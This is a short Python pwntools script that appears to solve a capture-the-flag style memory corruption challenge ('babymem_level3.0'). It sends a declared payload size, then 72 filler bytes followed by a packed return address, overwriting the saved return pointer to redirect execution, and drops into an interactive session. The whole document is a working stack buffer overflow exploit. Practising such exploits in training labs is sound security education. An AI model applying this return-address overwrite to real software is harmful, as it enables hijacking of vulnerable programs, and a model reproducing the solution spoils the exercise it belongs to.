from pwn import *

p = process('/challenge/babymem_level3.0')

p.recvuntil('Payload size:')
p.sendline(b'80')

payload = b'a' * 72 + p64(0x40169a) 

#p.recvline('Send your payload')
p.sendline(payload)

p.interactive()

